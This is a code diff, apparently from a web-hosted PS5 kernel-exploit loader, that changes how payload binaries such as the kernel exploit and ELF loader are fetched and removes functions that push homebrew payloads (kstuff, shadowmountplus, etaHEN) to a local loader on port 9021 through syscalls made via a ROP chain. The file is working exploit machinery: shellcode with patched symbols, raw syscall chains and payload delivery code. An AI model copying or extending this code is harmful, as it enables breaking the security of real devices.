@@ -6,6 +6,9 @@ const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
 
 const DEFAULT_KEXP = "kexp_2026_05_25.bin";
 const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";
+// Resolve payloads from the site currently being opened. This keeps a fork
+// from accidentally fetching binaries from the upstream site's URL.
+const PAYLOAD_BASE_URL = new URL("./payloads/", document.baseURI);
 
 const SHELLCODE = {
   size: 18912,
@@ -92,8 +95,9 @@ function resolveSymbols(p) {
 }
 
 async function fetchBinary(name) {
-  const response = await fetch("payloads/" + name);
-  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
+  const url = new URL(name, PAYLOAD_BASE_URL);
+  const response = await fetch(url, { cache: "no-store" });
+  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status + " from " + url.href);
   return new Uint8Array(await response.arrayBuffer());
 }
 
@@ -116,55 +120,6 @@ async function mapElf(name, p, chain) {
     throw new Error("kexp: " + name + " copy failed");
 
   return { base, size: elf.length };
-}
-
-async function connectToElfldr(p, chain) {
-  const address = p.malloc(16);
-  p.write8(address, new int64(0, 0));
-  p.write8(address.add32(8), new int64(0, 0));
-  p.write4(address, 0x3d230210); // AF_INET, port 9021
-  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1
-
-  for (let attempt = 0; attempt < 40; attempt++) {
-    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
-    const fd = socket.low | 0;
-    if (fd >= 0) {
-      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
-      if ((connected.low >>> 0) === 0) return fd;
-      await chain.syscall(SYS_CLOSE, fd);
-    }
-    await new Promise((resolve) => setTimeout(resolve, 250));
-  }
-
-  throw new Error("elfldr is not listening on port 9021");
-}
-
-async function sendElf(name, payload, p, chain) {
-  const fd = await connectToElfldr(p, chain);
-  try {
-    for (let offset = 0; offset < payload.size;) {
-      const length = Math.min(0x10000, payload.size - offset);
-      const written = (await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length)).low | 0;
-      if (written <= 0) throw new Error(name + " socket write failed");
-      offset += written;
-    }
-  } finally {
-    await chain.syscall(SYS_CLOSE, fd);
-  }
-}
-
-export async function loadOptionalPayloads(p, chain, log) {
-  log("preparing optional payloads");
-  const kstuff = await mapElf("kstuff.elf", p, chain);
-  const shadowmount = await mapElf("shadowmountplus.elf", p, chain);
-  const etaHEN = await mapElf("etaHEN.elf", p, chain);
-  await sendElf("kstuff.elf", kstuff, p, chain);
-  log("kstuff.elf sent");
-  await new Promise((resolve) => setTimeout(resolve, 3000));
-  await sendElf("shadowmountplus.elf", shadowmount, p, chain);
-  log("shadowmountplus.elf sent");
-  await sendElf("etaHEN.elf", etaHEN, p, chain);
-  log("etaHEN.elf sent");
 }
 
 function patchShellcode(blob, symbols) {
